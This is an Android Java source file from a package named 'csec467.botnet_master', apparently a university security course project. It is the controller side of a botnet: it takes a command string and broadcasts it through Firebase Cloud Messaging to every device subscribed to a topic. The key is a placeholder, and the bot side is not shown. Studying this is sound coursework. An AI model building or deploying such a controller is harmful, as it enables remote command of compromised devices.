package csec467.botnet_master;

import android.content.Context;
import android.os.StrictMode;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Toast;


import com.google.api.client.googleapis.auth.oauth2.GoogleCredential;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.Arrays;

public class send_push extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_send_push);
        String res = null;
        make_call(this, res);

    }

    public void make_call(Context v, String res) {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        String command_text = getIntent().getStringExtra("command");
        Toast.makeText(v, "Sending command:  " + command_text, Toast.LENGTH_LONG).show();
        try {
            URL u = null;
            try {
                u = new URL("https://fcm.googleapis.com/fcm/send");
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
            JSONObject body = new JSONObject();
            JSONObject notif = new JSONObject();
            try {
                body.put("message", command_text);
                notif.put("condition", "'corgi' in topics");
                notif.put("data", body);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Authorization", "key=<server key found in console goes here>");
            OutputStream os = conn.getOutputStream();
            os.write(notif.toString().getBytes());
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private static String getAccessToken() throws IOException {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        GoogleCredential googleCredential = GoogleCredential
                .fromStream(new FileInputStream("/data/data/csec467.botnet_master/files/service-account.json"))
                .createScoped(Arrays.asList("https://www.googleapis.com/auth/firebase.messaging"));
        googleCredential.refreshToken();
        return googleCredential.getAccessToken().toString();
    }
}
